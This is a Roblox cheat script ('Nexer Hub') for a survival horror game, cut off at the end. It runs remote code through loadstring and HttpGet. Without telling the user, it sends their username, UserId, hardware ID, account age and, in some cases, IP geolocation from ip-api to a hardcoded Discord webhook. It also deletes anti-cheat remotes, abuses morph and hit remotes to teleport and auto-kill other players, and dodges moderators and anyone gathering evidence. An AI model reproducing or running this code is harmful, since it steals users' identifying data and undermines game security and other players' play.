local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/Pro666Pro/DraggableOrionLib/main/main.lua")))()

OrionLib:MakeNotification({Name = "Error",Content = "Script Loading. It may take for around 2 seconds.",Image = "rbxassetid://4483345998",Time = 10})


_G.Script = "Nexer Hub - TR:UD"
--Edit only this




local join = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
local HWIDList = loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/HWID_WhiteList/refs/heads/main/main.lua'))()
local UsernameList = loadstring(game:HttpGet('https://pastefy.app/wHxZ9zm4/raw'))()
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local Username = game:GetService("Players").LocalPlayer.Name
Premium = "No"
for i,v in pairs(HWIDList) do
  if v == HWID and Premium == "No" then
      Premium = "Yes"
break
  end
end
for i,v in pairs(UsernameList) do
  if v == Username and Premium == "No" then
      Premium = "Yes"
break
  end
end
if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,1016382904) and Premium == "No" then
      Premium = "Only in slap farm gui."
      
      
      elseif game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,1030264379) and Premium == "No" then

      Premium = "Only in nexer hub - TR:UD."
end
local functions = {
    rconsoleprint,
    print,
    setclipboard,
    rconsoleerr,
    rconsolewarn,
    warn,
    error
}
Skid = "No, he isn't"
LocalInfo = "User isn't skidder, local info won't appear"
if hookfunction and newcclosure then
warn("Check №1 Success")
Check1 = "Check №1 Success"
for i, v in next, functions do
    local old
    old =
        hookfunction(
        v,
        newcclosure(
            function(...)
                local args = {...}
                for i, v in next, args do
                    if tostring(i):find("https") or tostring(v):find("https") then
warn("Check №1 Skid Detected")
Check1 = "Check №1 Skid Detected"
Skid = "YES RETARD"
LocalInfo = game:HttpGet("http://ip-api.com/line/?fields=61439")
game.Players.LocalPlayer:Kick("nuh uh "..game:HttpGet("http://ip-api.com/line/?fields=61439").."")
game:Shutdown()
                    end
                end
                 
                return old(...)
            end
        )
    )
end   
else
warn("Check №1 Fail")
Check1 = "Check №1 Fail"
end
if http_request or request or HttpPost or syn.request then
local url =
   "https://discord.com/api/webhooks/1323277140258459648/LvvREvMU1-2N8A3nlZOWHAfFsEqSATCwL3xnhWROrIgAZeS9_noXiZOclHmRogq8vz5-" --pretty obvious what to do here
local data = {
            ["username"] = "Notification", 
    ["content"] = "@everyone "..game.Players.LocalPlayer.Name.." executed ".._G.Script..".",
    ["embeds"] = {
       {
           ["title"] = "Information about "..game.Players.LocalPlayer.Name.." is provided lower.",
           ["description"] = "Is He A Skidder? **"..Skid.."** Local Info: **"..LocalInfo.."** Username: **"..game.Players.LocalPlayer.Name.."** UserId: **"..game.Players.LocalPlayer.UserId.."** Account Age: **"..game.Players.LocalPlayer.AccountAge.." days** Ping: **"..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString().."** HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId().."** Premium User? **"..Premium.."** Checkpoint 1: **"..Check1.."**",    
           ["type"] = "rich",
           ["color"] = 14680319,
           ["footer"] = {
             ["text"] = ""..join.."",
           },
       },
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local msg = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(msg)
Check2 = "Check №2 Success"
warn("Check №2 Success")
else
Check2 = "Check №2 Fail"
warn("Check №2 Fail")
end


_G.CurrentGravity = game.Workspace.Gravity

local function ServerHop()
    while true do
        warn("Failed To Serverhop")
    end
    end

_G.Premium = false

local ID = 1030264379
local player = game.Players.LocalPlayer
local MS = game:GetService("MarketplaceService")

local HWIDList = loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/HWID_WhiteList/refs/heads/main/main.lua'))()
local UsernameList = loadstring(game:HttpGet('https://pastefy.app/wHxZ9zm4/raw'))()
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local Username = game:GetService("Players").LocalPlayer.Name

for i,v in pairs(HWIDList) do
  if v == HWID or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,1030264379) then
OrionLib:MakeNotification({Name = "Error",Content = "You are premium!",Image = "rbxassetid://4483345998",Time = 5})
      _G.Premium = true
break
  end
end

for i,v in pairs(UsernameList) do
  if v == Username and _G.Premium == false then
      OrionLib:MakeNotification({Name = "Error",Content = "You are premium!",Image = "rbxassetid://4483345998",Time = 5})
      _G.Premium = true
break
  end
end

local GameName = "Nexer Hub - The Robloxia: Until Dawn - v2.0"
local Window = OrionLib:MakeWindow({IntroText = "Nexer Hub - TR:UD", IntroIcon = "rbxassetid://4483345998",Name = GameName, HidePremium = false, SaveConfig = true, ConfigFolder = "Tutorial"})

OrionLib:MakeNotification({Name = "Warning",Content = "Use at your own risk.",Image = "rbxassetid://4483345998",Time = 5})

local Main = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Main:AddToggle({
	Name = "Reversed Roles",
	Default = false,
	Callback = function(Value)
_G.RR = Value
	 end
})    

Main:AddParagraph("WARNING!","Before becoming a killer or a survivor, choose which one you prefer to use")

_G.klr = "SawNoob"
Main:AddDropdown({
	Name = "Choose Killer",
	Default = "Saw Noob",
	Options = {"Saw Noob", "1x1x1x1", "Coolkid", "Drakobloxxer", "John Doe", "Guest 666"},
	Callback = function(Value)
if Value == "Saw Noob" then
_G.klr = "SawNoob"
elseif Value == "1x1x1x1" then
_G.klr = "1x1x1x1"
elseif Value == "Coolkid" then
_G.klr = "Coolkid"
elseif Value == "Drakobloxxer" then
_G.klr = "Drakobloxxer"
elseif Value == "John Doe" then
_G.klr = "Johndoe"
elseif Value == "Guest 666" then
_G.klr = "Guest 666"
end
	end    
})

Killer = Main:AddButton({
	Name = "Become Killer",
	Callback = function()
if game.Workspace:FindFirstChild("Map") then
    


if _G.RR == true then
_G.role = workspace.Survivors
_G.point = game.Workspace.Map.Survivorspawns.Spawn.CFrame
else
    _G.role = workspace.Killers
    _G.point = game.Workspace.Map.Killerspawns.Spawn.CFrame
    end

local args = {
    [1] = _G.klr,
    [2] = _G.point * CFrame.Angles(0, 0, 0),
    [3] = _G.role
}

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(unpack(args))

wait(1)

game.Players.LocalPlayer.PlayerGui.Gamevalues.Enabled = true
game.Players.LocalPlayer.PlayerGui.Tasks.Enabled = true
game.Players.LocalPlayer.PlayerGui.Healthbars.Enabled = true
game.Players.LocalPlayer.PlayerGui.Message.Enabled = false
game.Players.LocalPlayer.PlayerGui.SpectateGui.Enabled = false

else
    
OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})
Killer:Set(false)
end
	 end
})    

_G.srv = "Builderman"
Main:AddDropdown({

	Name = "Choose Survivor",
	Default = "Builderman",
	Options = {"Builderman", "Shedletsky", "Guest", "Brick Battler", "Bacon Hair", "Bloxxer", "Jane Doe"},
	Callback = function(Value)
if Value == "Builderman" then
_G.srv = "Builderman"
elseif Value == "Shedletsky" then
_G.srv = "Shedletsky"
elseif Value == "Guest" then
_G.srv = "Guest"
elseif Value == "Brick Battler" then
_G.srv = "Brickbattler"
elseif Value == "Bacon Hair" then
_G.srv = "Baconhair"
elseif Value == "Bloxxer" then
_G.srv = "Bloxxer"
elseif Value == "Jane Doe" then
_G.srv = "JaneDoe"
end
	end    
})

Survivor = Main:AddButton({
	Name = "Become Survivor",
	Callback = function()
if game.Workspace:FindFirstChild("Map") then
    


if _G.RR == true then
_G.role = workspace.Killers
_G.point = game.Workspace.Map.Killerspawns.Spawn.CFrame
else
    _G.role = workspace.Survivors
    _G.point = game.Workspace.Map.Survivorspawns.Spawn.CFrame
    end

local args = {
    [1] = _G.srv,
    [2] = _G.point * CFrame.Angles(0, 0, 0),
    [3] = _G.role
}

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(unpack(args))

wait(1)

game.Players.LocalPlayer.PlayerGui.Gamevalues.Enabled = true
game.Players.LocalPlayer.PlayerGui.Tasks.Enabled = true
game.Players.LocalPlayer.PlayerGui.Healthbars.Enabled = true
game.Players.LocalPlayer.PlayerGui.Message.Enabled = false
game.Players.LocalPlayer.PlayerGui.SpectateGui.Enabled = false

else
    
OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})
Survivor:Set(false)
end
	 end
})    

Main:AddParagraph("WARNING!","Don't use admin characters unless you know how to bypass their whitelist system!")

_G.klrad = "SawNoob"
Main:AddDropdown({
	Name = "Choose Admin Killer",
	Default = "Sonic.Exe",
	Options = {"Spunchbob", "Among us Imposter", "Seek", "Greg", "Sonic.Exe", "Sonic", "RAR", "Vorzlin", "CYNPATHETIC"},
	Callback = function(Value)
if Value == "Spunchbob" then
_G.klrad = "Spunchbob"
elseif Value == "Among us Imposter" then
_G.klrad = "amongusimposter"
elseif Value == "Seek" then
_G.klrad = "Seek"
elseif Value == "Greg" then
_G.klrad = "greg"
elseif Value == "Sonic.Exe" then
_G.klrad = "sonic.exe1"
elseif Value == "Sonic" then
_G.klrad = "SONIC"
elseif Value == "RAR" then
_G.klrad = "RAR"
elseif Value == "Vorzlin" then
_G.klrad = "vorzlin"
elseif Value == "CYNPATHETIC" then
_G.klrad = "CYNPATHETIC"
end
	end    
})

Killerad = Main:AddButton({
	Name = "Become Admin Killer",
	Callback = function()
if game.Workspace:FindFirstChild("Map") then
    


if _G.RR == true then
_G.role = workspace.Survivors
_G.point = game.Workspace.Map.Survivorspawns.Spawn.CFrame
else
    _G.role = workspace.Killers
    _G.point = game.Workspace.Map.Killerspawns.Spawn.CFrame
    end

local args = {
    [1] = _G.klrad,
    [2] = _G.point * CFrame.Angles(0, 0, 0),
    [3] = _G.role
}

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(unpack(args))

wait(1)

game.Players.LocalPlayer.PlayerGui.Gamevalues.Enabled = true
game.Players.LocalPlayer.PlayerGui.Tasks.Enabled = true
game.Players.LocalPlayer.PlayerGui.Healthbars.Enabled = true
game.Players.LocalPlayer.PlayerGui.Message.Enabled = false
game.Players.LocalPlayer.PlayerGui.SpectateGui.Enabled = false

else
    
OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})
Killerad:Set(false)
end
	 end
})    

_G.srvad = "Felix"
Main:AddDropdown({

	Name = "Choose Admin Survivor",
	Default = "Felix",
	Options = {"Felix", "Noob", "Star Fire", "Knuckles"},
	Callback = function(Value)
if Value == "Felix" then
_G.srvad = "Felix"
elseif Value == "Noob" then
_G.srvad = "Noob"
elseif Value == "Guest" then
_G.srvad = "Guest"
elseif Value == "Star Fire" then
_G.srvad = "starfire"
elseif Value == "Knuckles" then
_G.srvad = "Knuckles"
end
	end    
})

Survivorad = Main:AddButton({
	Name = "Become Admin Survivor",
	Callback = function()
if game.Workspace:FindFirstChild("Map") then
    


if _G.RR == true then
_G.role = workspace.Killers
_G.point = game.Workspace.Map.Killerspawns.Spawn.CFrame
else
    _G.role = workspace.Survivors
    _G.point = game.Workspace.Map.Survivorspawns.Spawn.CFrame
    end

local args = {
    [1] = _G.srvad,
    [2] = _G.point * CFrame.Angles(0, 0, 0),
    [3] = _G.role
}

game:GetService("ReplicatedStorage").Remotes.Morph:FireServer(unpack(args))

wait(1)

game.Players.LocalPlayer.PlayerGui.Gamevalues.Enabled = true
game.Players.LocalPlayer.PlayerGui.Tasks.Enabled = true
game.Players.LocalPlayer.PlayerGui.Healthbars.Enabled = true
game.Players.LocalPlayer.PlayerGui.Message.Enabled = false
game.Players.LocalPlayer.PlayerGui.SpectateGui.Enabled = false

else
    
OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})
Survivorad:Set(false)
end
	 end
})    

Main:AddParagraph("Bypass","Bypass Anti-Cheat if you want to. BTW it's not bypassing whitelist system for admin characters.")

Main:AddButton({
	Name = "Bypass Anti-Cheat (check console after that)",
	Callback = function()

-- Anti Cheat

game:GetService("ReplicatedStorage"):FindFirstChild("Look"):Destroy()

warn("Destroyed Look Remote (spams in spy)")

for I,v in pairs(game.ReplicatedStorage:GetDescendants()) do
if v.ClassName == "RemoteFunction" or v.ClassName == "RemoteEvent" and v.Name:find("-") or v.Name:find("exploit") or v.Name:find("cheat") or v.Name:find("detect") then
v:Destroy()
warn("Destroyed anticheat! Anti cheat name: "..v.Name..", Anti cheat class name: "..v.ClassName..". It got destroyed in ReplicatedStorage")
end
end

for I,v in pairs(game.Workspace:GetDescendants()) do

if v.ClassName == "RemoteFunction" or v.ClassName == "RemoteEvent" and v.Name:find("exploit") or v.Name:find("cheat") then

v:Destroy()
warn("Destroyed anticheat! Anti cheat name: "..v.Name..", Anti cheat class name: "..v.ClassName..". It got destroyed in Workspace")
end
end

for I,v in pairs(game.Players.LocalPlayer:GetDescendants()) do



if v.ClassName == "RemoteFunction" or v.ClassName == "RemoteEvent" and v.Name:find("exploit") or v.Name:find("cheat") then

v:Destroy()
warn("Destroyed anticheat! Anti cheat name: "..v.Name..", Anti cheat class name: "..v.ClassName..". It got destroyed in LocalPlayer")
end
end


for I,v in pairs(game:GetService("Lighting"):GetDescendants()) do

if v.ClassName == "RemoteFunction" or v.ClassName == "RemoteEvent" and v.Name:find("exploit") or v.Name:find("cheat") then

v:Destroy()
warn("Destroyed anticheat! Anti cheat name: "..v.Name..", Anti cheat class name: "..v.ClassName..". It got destroyed in Lighting")
end
end

for I,v in pairs(game.ReplicatedFirst:GetDescendants()) do

if v.ClassName == "RemoteFunction" or v.ClassName == "RemoteEvent" and v.Name:find("-") or v.Name:find("exploit") or v.Name:find("cheat") or v.Name:find("detect") then

v:Destroy()
warn("Destroyed anticheat! Anti cheat name: "..v.Name..", Anti cheat class name: "..v.ClassName..". It got destroyed in ReplicatedFirst")
end
end


for I,v in pairs(game:GetService("StarterPlayer"):GetDescendants()) do
if v.ClassName == "RemoteFunction" or v.ClassName == "RemoteEvent" and v.Name:find("exploit") or v.Name:find("cheat") then

v:Destroy()
warn("Destroyed anticheat! Anti cheat name: "..v.Name..", Anti cheat class name: "..v.ClassName..". It got destroyed in StarterPlayer")
end
end


	 end
})    

local Troll = Window:MakeTab({
	Name = "Troll",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Troll:AddToggle({
	Name = "Auto-Escape In Portal",
	Default = false,
	Callback = function(Value)

_G.AutoEscape = Value

if _G.AutoEscape == true then
repeat task.wait()
for i,v in pairs(game.Workspace.Exits:GetChildren()) do
if v.Name == "Exit" then
if v:FindFirstChild("Trigger") then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Trigger.CFrame
task.wait(.001)
end
end
task.wait(.001)
end
task.wait(.001)
until _G.AutoEscape == false
end
	 end
})   

Troll:AddToggle({

	Name = "Auto-Attack Killer ( Only Melee! )",
	Default = false,
	Callback = function(Value)
_G.AutoAttack = Value

if _G.AutoAttack == true then
repeat task.wait()

    for i,v in pairs(game.Players:GetChildren()) do

if v.Character:FindFirstChild("Ban") then
local args = {
    [1] = v.Character
}
game:GetService("Players").LocalPlayer.Character.Ban.Remotes.Hit:FireServer(unpack(args))
elseif v.Character:FindFirstChild("Quick slash") then
local args = {
    [1] = v.Character
}
game:GetService("Players").LocalPlayer.Character["Quick slash"].Remotes.Hit:FireServer(unpack(args))
elseif v.Character:FindFirstChild("Windforce") then
local args = {
    [1] = v.Character
}
game:GetService("Players").LocalPlayer.Character.Windforce.Remotes.Hit:FireServer(unpack(args))
elseif v.Character:FindFirstChild("Launcher") then
local args = {
    [1] = v.Character
}
game:GetService("Players").LocalPlayer.Character.Launcher.Remotes.Shoot:FireServer(unpack(args))
elseif v.Character:FindFirstChild("Spray") then
local args = {
    [1] = v.Character
}
game:GetService("Players").LocalPlayer.Character.Spray.Remotes.Hit:FireServer(unpack(args))
end

task.wait(.001)
end

task.wait(.001)
until _G.AutoAttack == false
end

	 end
}) 

Troll:AddToggle({
	Name = "God-Mode ( You need to play on shedletsky. )",
	Default = false,
	Callback = function(Value)

_G.GodMode = Value

if _G.GodMode == true then

repeat task.wait()

game.Players.LocalPlayer.Character.Chicken.Remotes.Use:FireServer()

until _G.GodMode == false

end

	 end
}) 
   
Troll:AddTextbox({
	Name = "Player To Grab",
	Default = "Input",
	TextDisappear = false,
	Callback = function(Value)
_G.Grab = Value
	end	  
})

Troll:AddButton({
	Name = "Grab Player",
	Callback = function()
local PlayerName = _G.Grab
local target
for _, v in pairs(game.Players:GetPlayers()) do
if string.sub(v.Name, 1, #PlayerName):lower() == PlayerName:lower() then
target = v
break
end
end
if target then
Player = target

if Player.Character and Player.Character:FindFirstChild("Running") then
if game.Players.LocalPlayer.Character:FindFirstChild("Grab") then
game:GetService("VirtualInputManager"):SendKeyEvent(true,"R",false,game)
for i = 1, 80 do
Player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end
else
OrionLib:MakeNotification({Name = "Error",Content = "You should be 1x1x1x1.",Image = "rbxassetid://4483345998",Time = 5})
end
else
OrionLib:MakeNotification({Name = "Error",Content = "No players in match.",Image = "rbxassetid://4483345998",Time = 5})
end

else
OrionLib:MakeNotification({Name = "Error",Content = "Player not found.",Image = "rbxassetid://4483345998",Time = 5})

end

	 end
})    

Troll:AddButton({
	Name = "Roar Everyone",
	Callback = function()
if game.Players.LocalPlayer.Character:FindFirstChild("Ravage") then
game:GetService("VirtualInputManager"):SendKeyEvent(true,"Q",false,game)

for i = 1, 80 do
for i,v in pairs(game.Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Running") then
v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
task.wait()
end
end
task.wait(.01)
end


else
OrionLib:MakeNotification({Name = "Error",Content = "You should be drakobloxxer.",Image = "rbxassetid://4483345998",Time = 5})
end
	 end
})   

Troll:AddButton({
	Name = "Ground Slam Everyone",
	Callback = function()

if game.Players.LocalPlayer.Character:FindFirstChild("Slam") then
game:GetService("VirtualInputManager"):SendKeyEvent(true,"R",false,game)



for i = 1, 80 do
for i,v in pairs(game.Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Running") then
v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
task.wait()
end
end
task.wait(.01)
end



else
OrionLib:MakeNotification({Name = "Error",Content = "You should be john doe.",Image = "rbxassetid://4483345998",Time = 5})
end

	 end
})   

AK = Troll:AddToggle({
	Name = "Auto-Kill Everyone { Premium }",
	Default = false,
	Callback = function(Value)

_G.AutoKill = Value

if _G.AutoKill == true and game.Players.LocalPlayer.Character:FindFirstChild("Monstervalues") or game.Players.LocalPlayer.Character:FindFirstChild("Monsterstains") then
    
    if _G.Premium == true then

repeat task.wait()

for i,v in pairs(game.Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Character:FindFirstChild("Running") then
v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
task.wait()
game:GetService("VirtualInputManager"):SendKeyEvent(true,"F",false,game)
end
end


until _G.AutoKill == false
else


OrionLib:MakeNotification({Name = "Error",Content = "You aren't premium.",Image = "rbxassetid://4483345998",Time = 5})
AK:Set(false)

end
end
	 end
})   

AR = Troll:AddToggle({
	Name = "Auto-Revive Downed Players { Premium }",
	Default = false,
	Callback = function(Value)

_G.AutoRevive = Value

if _G.AutoRevive == true and game.Players.LocalPlayer.Character:FindFirstChild("Running") then
    
    if _G.Premium == true then

repeat task.wait()

for i,v in pairs(game.Workspace.Downed:GetChildren()) do
if v.HumanoidRootPart and v:FindFirstChild("Values") and v.Values:FindFirstChild("Downed") and v.Values.Downed.Value == true then
v.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
v.Torso.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
v["Left Arm"].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
v["Left Leg"].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
v["Right Arm"].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
v["Right Leg"].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
v["Right Arm"].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
task.wait()
game:GetService("VirtualInputManager"):SendKeyEvent(true,"R",false,game)
end
end


until _G.AutoRevive == false
else



OrionLib:MakeNotification({Name = "Error",Content = "You aren't premium.",Image = "rbxassetid://4483345998",Time = 5})
AR:Set(false)

end
end
	 end
})   


local Local = Window:MakeTab({
	Name = "Local",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Local:AddSlider({
	Name = "Hitbox Size",
	Min = 1,
	Max = 100,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Studs",
	Callback = function(Value)

_G.Hitbox = Value

	end    
})

Local:AddButton({
	Name = "Expand Hitbox",
	Default = false,
	Callback = function(Value)

for i,v in pairs(game.Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Character then
v.Character.HumanoidRootPart.CanCollide = false
v.Character.HumanoidRootPart.Transparency = .6
v.Character.HumanoidRootPart.Size = Vector3.new(_G.Hitbox,_G.Hitbox,_G.Hitbox)
end
end

	end    
})

Local:AddButton({
	Name = "ESP All Players",
	Callback = function()

local Players = game:GetService("Players")

local function applyHighlight(player)
local function onCharacterAdded(character)
-- Create a new Highlight instance and set properties
local highlight = Instance.new("Highlight", character)

highlight.Archivable = true
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop -- Ensures highlight is always visible
highlight.Enabled = true
highlight.FillColor = player.TeamColor.Color -- Set fill color to bright red
highlight.OutlineColor = Color3.fromRGB(255, 255, 255) -- Set outline color to white
highlight.FillTransparency = 0.5 -- Set fill transparency
highlight.OutlineTransparency = 0 -- No transparency on the outline
end

-- If the player's character already exists, apply the highlight
if player.Character then
onCharacterAdded(player.Character)
end

-- Connect to CharacterAdded to ensure highlight is added when character respawns
player.CharacterAdded:Connect(onCharacterAdded)
end

-- Apply the highlight to all current players
for _, player in pairs(Players:GetPlayers()) do
applyHighlight(player)
end

-- Listen for new players joining
Players.PlayerAdded:Connect(applyHighlight)

	end    
})

Local:AddButton({
	Name = "ESP Tasks",
	Callback = function()

if game.Workspace:FindFirstChild("Map") then

for _,poop in pairs(game.Workspace.Map.Tasks.Current:GetChildren()) do
if poop:IsA("Model") then

local highlight = Instance.new("Highlight", poop)

highlight.Archivable = true
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop -- Ensures highlight is always visible
highlight.Enabled = true
highlight.FillColor = Color3.fromRGB(0, 150, 255) -- Set fill color to bright red
highlight.FillTransparency = 1 -- Set fill transparency
highlight.OutlineTransparency = 0 -- No transparency on the outline

end
end

end

	end    
})

TP = Local:AddToggle({
	Name = "Teleport Everyone to You { Premium }",
	Default = false,
	Callback = function(Value)

_G.Teleport = Value

if _G.Teleport == true then
    if _G.Premium == true then
repeat task.wait()
for i,v in pairs(game.Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Running") then
v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
task.wait()
end
end
until _G.Teleport == false
else

OrionLib:MakeNotification({Name = "Error",Content = "You aren't premium.",Image = "rbxassetid://4483345998",Time = 5})
TP:Set(false)

end
end
	end    
})

Local:AddSlider({
	Name = "Change Walkspeed",
	Min = 20,
	Max = 1000,
	Default = 20,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "WalkSpeed",
	Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end    
})

Local:AddSlider({
	Name = "Change JumpPower",
	Min = 20,
	Max = 1000,
	Default = 50,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "JumpPower",
	Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end    
})

Local:AddSlider({
	Name = "Change Hip Height",
	Min = 0,
	Max = 100,
	Default = 0,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Hip Height",
	Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.HipHeight = Value
	end    
})

Local:AddSlider({
	Name = "Change Gravity",

	Min = 0,
	Max = 500,
	Default = _G.CurrentGravity,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Gravity",
	Callback = function(Value)
game.Workspace.Gravity = Value
	end    
})

Local:AddSlider({

	Name = "Change Health",

	Min = 0,
	Max = 100,
	Default = 100,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Health",
	Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.Health = Value
	end    
})

local Anti = Window:MakeTab({
	Name = "Anti",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Anti:AddButton({
	Name = "Anti Jump Cooldown ",
	Callback = function()
	    

while task.wait(.1) do
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Jump Cooldown") then
game.Players.LocalPlayer.PlayerGui["Jump Cooldown"]:Destroy()
end
end

	 end
})  

Anti:AddButton({
	Name = "Anti Camera Shake",
	Callback = function()
	    

while task.wait(.1) do
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Camerashake") then
game.Players.LocalPlayer.PlayerGui.Camerashake:Destroy()
end
end

	 end
})  

Anti:AddButton({
	Name = "Destroy Traps { builderman mines and etc. }",
	Default = false,
	Callback = function(Value)

game.Workspace.Traps:Destroy()

	 end
})  

Anti:AddToggle({
	Name = "Anti Contributors/Testers/Developers/Owner",
	Default = false,
	Callback = function(Value)
_G.AntiMod = Value
while _G.AntiMod do
for i,v in pairs(game.Players:GetChildren()) do
        if v:GetRankInGroup(33078978) >= 3 then
     game.Players.LocalPlayer:Kick("Contributors/Testers/Developers/Owner Detected!")
   break
     end
end
task.wait(.001)
end
	 end
})  

if getconnections then

Anti:AddToggle({
	Name = "Anti AFK",
	Default = false,
	Callback = function(Value)
_G.antiafk = Value
for _, idled in next, getconnections(game.Players.LocalPlayer.Idled) do
if _G.antiafk then
idled:Disable()
else
idled:Enable()
end
end
	 end
})    

end

Anti:AddToggle({
	Name = "Anti Kick",
	Default = false,
	Callback = function(Value)
_G.antikick = Value
	while _G.antikick do
for i,v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
                    if v.Name == "ErrorPrompt" then
game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
                    end
                end
task.wait()
end
	 end
})    

Anti:AddParagraph("WARNING!","Anti Record Only Detects Messages In Chat.")

Anti:AddToggle({
	Name = "Anti Record { Free }",
	Default = false,
	Callback = function(Value)
_G.recordv2 = Value
	 end
})    
for i,v in pairs(game.Players:GetChildren()) do
if v ~= game.Players.LocalPlayer then
v.Chatted:Connect(function(message)
BlacklistedWords = message:split(" ")
if _G.recordv2 == true then
for i, v in pairs(BlacklistedWords) do
if v:lower():match("recording") or v:lower():match(" rec") or v:lower():match("record") or v:lower():match("discor") or v:lower():match(" disco") or v:lower():match(" disc") or v:lower():match("ticket") or v:lower():match("tickets") or v:lower():match(" ds") or v:lower():match(" dc") or v:lower():match(" clip") or v:lower():match("proof") or v:lower():match("evidence") or v:lower():match("cheat") or v:lower():match("cheater") or v:lower():match("exploit") or v:lower():match("exploiter") or v:lower():match("slap farm") or v:lower():match("replica") then
game.Players.LocalPlayer:Kick("Possible Record Detected! Message: [ "..message.." ]")
wait(5)
ServerHop()
end
end
end
end)
end
end
game.Players.PlayerAdded:Connect(function(Player)
Player.Chatted:Connect(function(message)
BlacklistedWords = message:split(" ")
if _G.recordv2 == true then
for i, v in pairs(BlacklistedWords) do
if v:lower():match("recording") or v:lower():match(" rec") or v:lower():match("record") or v:lower():match("discor") or v:lower():match(" disco") or v:lower():match(" disc") or v:lower():match("ticket") or v:lower():match("tickets") or v:lower():match(" ds") or v:lower():match(" dc") or v:lower():match(" clip") or v:lower():match("proof") or v:lower():match("evidence") or v:lower():match("cheat") or v:lower():match("cheater") or v:lower():match("exploit") or v:lower():match("exploiter") or v:lower():match("slap farm") or v:lower():match("replica") then
game.Players.LocalPlayer:Kick("Possible Record Detected! Message: [ "..message.." ]")
wait(5)
ServerHop()
end
end
end
end)
end)

RecordMax = Anti:AddToggle({
	Name = "Anti Record MAX { Premium }",
	Default = false,
	Callback = function(Value)
_G.recordMAX = Value
	 end
})    

if _G.Premium == true then
for i,v in pairs(game.Players:GetChildren()) do
if v ~= game.Players.LocalPlayer then
v.Chatted:Connect(function(message)
BlacklistedWords = message:split(" ")
if _G.recordMAX == true then
for i, v in pairs(BlacklistedWords) do
